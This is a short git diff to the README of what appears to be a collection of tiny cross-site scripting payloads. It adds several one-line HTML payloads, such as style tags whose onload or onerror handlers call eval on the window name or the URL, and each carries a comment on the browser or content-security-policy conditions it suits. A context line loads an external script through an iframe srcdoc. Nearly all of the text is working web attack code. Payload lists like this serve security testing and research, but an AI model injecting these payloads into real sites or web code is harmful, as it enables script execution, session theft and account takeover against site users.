@@ -40,4 +40,16 @@ The DEMO available here: <https://terjanq.github.io/Tiny-XSS-Payloads/index.html
 
 <!-- If unsafe-inline is disabled in CSP and external scripts allowed -->
 <iframe/srcdoc="<script/src=//Ǌ.₨></script>">
+
+<!-- If inline styles are allowed -->
+<style/onload=eval(name)>
+
+<!-- If inline styles are allowed, Safari only -->
+<style/onload=write(URL)>
+
+<!-- If inline styles are allowed and the URL can be controlled -->
+<style/onload=eval(`'`+URL)>
+
+<!-- If inline styles are blocked -->
+<style/onerror=eval(name)>
 ```
